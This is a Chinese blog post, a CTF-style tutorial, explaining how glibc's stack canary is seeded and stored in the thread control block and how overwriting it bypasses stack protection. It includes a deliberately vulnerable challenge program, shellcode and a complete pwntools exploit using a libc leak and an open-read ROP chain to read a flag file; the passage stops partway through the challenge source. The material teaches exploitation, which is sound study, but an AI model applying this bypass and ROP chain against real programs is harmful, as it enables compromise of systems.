<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>修改TCB来绕过canary | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>修改TCB来绕过canary</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-02-17T12:54:29.000Z" id="date"> 2023-02-17</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-02-17T16:00:01.224Z" id="updated"> 2023-02-18</time></div></span><br><span>文章总字数: <div class="control">2.8k</div></span><br><span>预计阅读时间: <div class="control">12 分钟</div></span></div></div><hr><div id="post-content"><p>以往做过的开启了canary保护的题目 一般都是通过格式化字符串泄露 从而来绕过canary 最近在学习免杀的时候 意外了解了canary的生成机制 从而就有了今天的这一篇文章 总体下来还是收获颇丰</p>
<h2 id="什么是canary"><a href="#什么是canary" class="headerlink" title="什么是canary"></a>什么是canary</h2><p>由于c语言并没有检查数组的下标 所以其存在溢出的可能性 诱发了栈溢出漏洞 可以使得攻击者任意的控制程序执行流 对此 canary机制有效预防了栈溢出的操作</p>
<p>其通过在栈帧的bp寄存器间隔一个字长(往低地址方向)的地方存放了一串随机数(末位为\x00 目的是防止被printf等函数泄露)</p>
<p>在函数结束前 进行了一个异或检查 如果发现此地址处的canary被修改了 那么则判定为发生了栈溢出的行为</p>
<p>则会跳转到**___stack_chk_fail**函数 该函数负责输出错误信息并且终止程序</p>
<p><img src="https://pic.imgdb.cn/item/63ef7c53f144a01007eed48d.png"></p>
<p>函数栈帧在形成初期 从 <strong>fs:0x28</strong> 赋值 并将其入栈</p>
<p><img src="https://pic.imgdb.cn/item/63ef7c37f144a01007ee9d2f.png"></p>
<p>函数结束前进行异或判定 如果结尾为0 就通过jz指令跳转到 <strong>leave|ret</strong> 指令处返回父栈帧</p>
<p><img src="https://pic.imgdb.cn/item/63ef7d80f144a01007f11c4f.png"></p>
<p>否则就调用**___stack_chk_fail**函数结束程序</p>
<p>而在libc2.23及以下的版本中 <strong>___stack_chk_fail</strong>函数会根据argv[0]存放的程序路径来输出下面这样的错误信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://pic.imgdb.cn/item/63ef7e1cf144a01007f2865a.png"></p>
<p>而argv[0]位于当前栈帧的栈底 可以通过溢出篡改其为flag 从而获取flag</p>
<p><img src="https://pic.imgdb.cn/item/63ef7e9df144a01007f3c751.png"></p>
<p>这里直接在源码中修改argv[0] 看看效果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    argv[<span class="number">0</span>]=<span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://pic.imgdb.cn/item/63ef83b4f144a01007030076.png"></p>
<p>不过 要注意的是 其输出的是路径 也就是字符串 而非输出该路径对应文件的内容</p>
<p>接着我们更换一下libc 文件 使其为libc2.27再次尝试 源码不变</p>
<p><img src="https://pic.imgdb.cn/item/63ef8475f144a0100704d4ef.png"></p>
<p>可以发现其直接默认输出unknown了</p>
<p>同时这里发现了一个有趣的现象 到达一定长度后 溢出的数据会被当作指令执行 这就需要进一步研究了</p>
<p><img src="https://pic.imgdb.cn/item/63ef84b1f144a010070561f2.png"></p>
<p>不过由于我实在是太心急把这篇文章写出来 所以暂时是先咕咕了 后续会开一个新篇章研究这个现象</p>
<p>上述稍微跑题了一下  说回canary  栈上的canary是由 <strong>fs:28h</strong> 处提供的值 我们对这个地址朔源一下</p>
<p>fs是一个寄存器 其指向当前活动线程的TEB结构</p>
<p>TEB是一个线程环境块   进程中每个线程都对应着一个TEB结构体 其存储了线程的各种信息</p>
<p>不同的偏移对应着不同的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">000 指向SEH链指针</span><br><span class="line">004 线程堆栈顶部</span><br><span class="line">008 线程堆栈底部</span><br><span class="line">00C SubSystemTib</span><br><span class="line">010 FiberData</span><br><span class="line">014 ArbitraryUserPointer</span><br><span class="line">018 FS段寄存器在内存中的镜像地址</span><br><span class="line">020 进程PID</span><br><span class="line">024 线程ID</span><br><span class="line">02C 指向线程局部存储指针</span><br><span class="line">030 PEB结构地址（进程结构）</span><br><span class="line">034 上个错误号</span><br></pre></td></tr></table></figure>

<p>但是fs中存放的TEB地址需要经过解析之后才能显示</p>
<p><img src="https://pic.imgdb.cn/item/63ef918df144a0100724afdf.png"></p>
<p>调用<strong>pthread_self</strong>函数就可以获取到TEB的位置</p>
<p><img src="https://pic.imgdb.cn/item/63ef91e6f144a01007254e12.png"></p>
<p>可以在对应位置找到canary 而canary判断是否被更改 是将栈上的和这里的进行比较</p>
<p>如果我们修改了TEB上的canary  那么栈上的canary就可以很轻易的被我们绕过</p>
<p>那么TEB上的canary又是从何而来呢  这就要从内核的_dl_random说起了</p>
<p>其是一个地址 用来指向内核中存储随机数的地方</p>
<p>该随机数初始化于动态链接之前</p>
<p>其存放于auxiliary vector 数组中 该数组是用来辅助程序运行的数据数组</p>
<p>其在dl_main函数中被调用 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Addr)</span><br><span class="line">_dl_sysdep_start (void **start_argptr,</span><br><span class="line">     void (*dl_main) (const ElfW(Phdr) *phdr, ElfW(Word) phnum,</span><br><span class="line">          ElfW(Addr) *user_entry, ElfW(auxv_t) *auxv))</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  DL_FIND_ARG_COMPONENTS (start_argptr, _dl_argc, _dl_argv, _environ,</span><br><span class="line">         GLRO(dl_auxv));</span><br><span class="line">  for (av = GLRO(dl_auxv); av-&gt;a_type != AT_NULL; set_seen (av++))</span><br><span class="line">    ...</span><br><span class="line">   case AT_RANDOM:</span><br><span class="line">   _dl_random = (void *) av-&gt;a_un.a_val;</span><br><span class="line">   break;</span><br><span class="line">    ...</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着是__libc_start_main函数 其生成canary的源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// sysdeps\unix\sysv\linux\dl-osinfo.h</span><br><span class="line">static inline uintptr_t __attribute__ ((always_inline))</span><br><span class="line">_dl_setup_stack_chk_guard (void *dl_random)</span><br><span class="line">&#123;</span><br><span class="line">  union</span><br><span class="line">  &#123;</span><br><span class="line">    uintptr_t num;</span><br><span class="line">    unsigned char bytes[sizeof (uintptr_t)];</span><br><span class="line">  &#125; ret;</span><br><span class="line"></span><br><span class="line">  /* We need in the moment only 8 bytes on 32-bit platforms and 16</span><br><span class="line">     bytes on 64-bit platforms.  Therefore we can use the data</span><br><span class="line">     directly and not use the kernel-provided data to seed a PRNG.  */</span><br><span class="line">  memcpy (ret.bytes, dl_random, sizeof (ret));</span><br><span class="line">#if BYTE_ORDER == LITTLE_ENDIAN</span><br><span class="line">  ret.num &amp;= ~(uintptr_t) 0xff;</span><br><span class="line">#elif BYTE_ORDER == BIG_ENDIAN</span><br><span class="line">  ret.num &amp;= ~((uintptr_t) 0xff &lt;&lt; (8 * (sizeof (ret) - 1)));</span><br><span class="line">#else</span><br><span class="line"># error &quot;BYTE_ORDER unknown&quot;</span><br><span class="line">#endif</span><br><span class="line">  return ret.num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>canary的值和dl_random一致  只不过在最后一个字节强制使其为\x00</p>
<p>接着来到_libc_start_init函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  /* Set up the stack checker&#x27;s canary.  */</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"># ifdef THREAD_SET_STACK_GUARD</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"># else</span><br><span class="line">  __stack_chk_guard = stack_chk_guard;</span><br><span class="line"># endif</span><br></pre></td></tr></table></figure>

<p>如果设置了THREAD_SET_STACK_GUARD宏 那么canary就会被设置进入线程局部存储</p>
<p>PS:一直没有搞清楚TEB TCB pthread三者的关系 上述的描述可能存在很大问题 更详细的源码级别可以看这篇博客 以我的水平很难对其进行复述</p>
<p><a target="_blank" rel="noopener" href="https://kiprey.github.io/2022/08/thread_canary/#%E4%B8%89%E3%80%81%E6%B7%B1%E5%85%A5-glibc">浅析 Linux 程序的 Canary 机制 | Kiprey’s Blog</a></p>
<p><img src="https://pic.imgdb.cn/item/63ef931af144a010072786f1.png"></p>
<p>在gdb中我们修改其值为0 接下一路n到函数结束前的canary判断</p>
<p><img src="https://pic.imgdb.cn/item/63ef947af144a010072a0962.png"></p>
<p>此时只要rcx寄存器中的值与fs:0x28中的值相同  就会触发je指令 正常结束栈帧</p>
<p>但是显然 此时rcx寄存器保存的是在函数最开始入栈的旧canary值 而此时fs:0x28处的值已经被我们修改为0 如果此时进行xor 显然结果是不会为0</p>
<p>我们再次更改一下rcx寄存器的值 并且执行这一步异或</p>
<p>此时eflags寄存器的值为<img src="https://pic.imgdb.cn/item/63ef97bdf144a01007309261.png"></p>
<p>其二进制形式为1001000110</p>
<p>ZF标志位是1 那么jz指令就会跳转</p>
<p>于是就不会触发__stack_chk_fail函数 所以我们成功绕过了canary</p>
<p>上述的绕过是基于修改主TCB中的canary 还有一种办法是修改子线程的TCB 这里不做说明</p>
<h2 id="题目实例"><a href="#题目实例" class="headerlink" title="题目实例"></a>题目实例</h2><p>网上没有找到利用到这个知识点的题目 索性自己出了一题 233</p>
<p>题目源码、附件和exp在文件末尾提供 有兴趣的师傅可以试一试</p>
<p>编译环境ubuntu18.04 libc2.27</p>
<p><img src="https://pic.imgdb.cn/item/63ef9dbcf144a010074130da.png"></p>
<p>开启了沙盒和canary保护</p>
<p>ida打开 一共有三个值得注意的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+48h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = seccomp_init(<span class="number">2147418112LL</span>, argv, envp);</span><br><span class="line">  seccomp_rule_add(v4, <span class="number">0LL</span>, <span class="number">59LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_load(v4);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;I&#x27;m Captain Nanhe\n&quot;</span>, <span class="number">0x12</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Say some old spells to start the journey\n&quot;</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;retaddr, <span class="number">0x15</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+0h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">24</span>]; <span class="comment">// [rsp+A0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Tell me the location of the Eye of the Deep Sea\n&quot;</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;I have magic\n&quot;</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Let&#x27;s go!\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, v2, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400817 hint            proc near</span><br><span class="line">.text:0000000000400817 ; __unwind &#123;</span><br><span class="line">.text:0000000000400817                 push    rbp</span><br><span class="line">.text:0000000000400818                 mov     rbp, rsp</span><br><span class="line">.text:000000000040081B                 jmp     rsp</span><br><span class="line">.text:000000000040081B hint            endp</span><br></pre></td></tr></table></figure>

<p>其中hint函数是由内联汇编写的 所以ida反编译出来的伪代码为啥参考性</p>
<p>首先来分析main函数 read读入的地址是直接从ret addr开始的 一共可以读入0x16字节的数据</p>
<p>再联想到hint函数提供了一个汇编指令 jmp rsp 那么显然这里的read是用来手写shellcode并且执行的</p>
<p>来分析一下main函数执行leave|ret 时各个寄存器的值</p>
<p>main函数的最后 我用patch修改了寄存器的赋值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009DB                 mov     rax, 1</span><br><span class="line">.text:00000000004009E2                 mov     rdi, rax</span><br><span class="line">.text:00000000004009E5                 mov     esi, 0</span><br><span class="line">.text:00000000004009EA                 mov     rcx, [rbp+var_8]</span><br><span class="line">.text:00000000004009EE                 xor     rcx, fs:28h</span><br><span class="line">.text:00000000004009F7                 jz      short locret_4009FE</span><br><span class="line">.text:00000000004009F9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>

<p>此时rax&#x3D;1 rdi&#x3D;1 rdx&#x3D;21 esi&#x3D; 0</p>
<p>去掉覆盖retaddr所需要的8个字节 我们还剩下13个字节用来编写shellcode</p>
<p>如果这里想用构造read以此来读入更多的字节从而在这里就直接获取flag 会因为字节不够而失败</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov rsi,0x601080+0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">push 0x400820</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcode)))</span><br><span class="line"><span class="comment">#19</span></span><br></pre></td></tr></table></figure>

<p>而如果我们在这里将rsi赋值为write函数的got表 随后syscall 就可以调用write函数泄露基址 随后我们将vuln函数的地址入栈 接着触发ret指令 就可以跳转到vuln函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov esi,0x601028</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">push 0x400820</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>接着来看vuln函数 其给了我们向任意地址写入8个字节数据的机会 随后又给了一次栈溢出的机会 但是程序开启了canary保护 并且开启了沙盒</p>
<p>如果我们此时想要使用onegadget来覆盖哪个函数的got表的话显然是行不通的  直接利用栈溢出构造orw的话也会因为canary而无法实现</p>
<p>于是这里的任意写就用来向TEB结构体中的canary覆盖掉</p>
<p>但是我们想要进行orw的rop链构造 还需要找个地址写入.&#x2F;flag字符串 所以我们利用栈溢出再次返回到vuln函数 再次利用一次任意写 在bss段上写入.&#x2F;flag</p>
<p>最后就可以成功获取flag</p>
<p>完整exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./locate&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Say some old spells to start the journey&quot;</span>)</span><br><span class="line">jmp_rsp = <span class="number">0x40081B</span></span><br><span class="line">write_got = <span class="number">0x601028</span></span><br><span class="line">vuln_addr = <span class="number">0x400820</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov esi,0x601028</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">push 0x400820</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = p64(jmp_rsp)+asm(shellcode)</span><br><span class="line">io.send(payload)</span><br><span class="line">write_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;write_addr :&quot;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">pthread_self = libc_addr + (<span class="number">0x7f61612d8740</span>-<span class="number">0x7f6160ab9000</span>)</span><br><span class="line">success(<span class="string">&quot;pthread_self :&quot;</span>+<span class="built_in">hex</span>(pthread_self))</span><br><span class="line">canary_addr = pthread_self+<span class="number">5</span>*<span class="number">0x8</span></span><br><span class="line">success(<span class="string">&quot;canary_addr :&quot;</span>+<span class="built_in">hex</span>(canary_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Tell me the location of the Eye of the Deep Sea&quot;</span>)</span><br><span class="line">io.send(p64(canary_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;I have magic&quot;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x100</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Let&#x27;s go!&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0x100</span>)*<span class="number">5</span>+p64(vuln_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Tell me the location of the Eye of the Deep Sea&quot;</span>)</span><br><span class="line">flag_addr = <span class="number">0x601070</span></span><br><span class="line">bss_addr = <span class="number">0x601060</span></span><br><span class="line">io.send(p64(flag_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;I have magic&quot;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Let&#x27;s go!&quot;</span>)</span><br><span class="line">rdi_addr = <span class="number">0x0000000000400a63</span></span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x0000000000023a6a</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x0000000000001b96</span></span><br><span class="line">puts_addr = libc_addr + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0x100</span>)*<span class="number">5</span></span><br><span class="line">payload += p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(rdx_addr)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>

<p>题目源码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hint</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;jmp %rsp\n\t&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *c[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> b[<span class="number">20</span>];</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;Tell me the location of the Eye of the Deep Sea\n&quot;</span>,<span class="number">48</span>);</span><br><span class="line">    read(<span class="number">0</span>,c,<span class="number">0x8</span>);</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;I have magic\n&quot;</span>,<span class="number">13</span>);</span><br><span class="line">    read(<span class="number">0</span>,*c,<span class="number">0x8</span>);</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;Let&#x27;s go!\n&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    read(<span 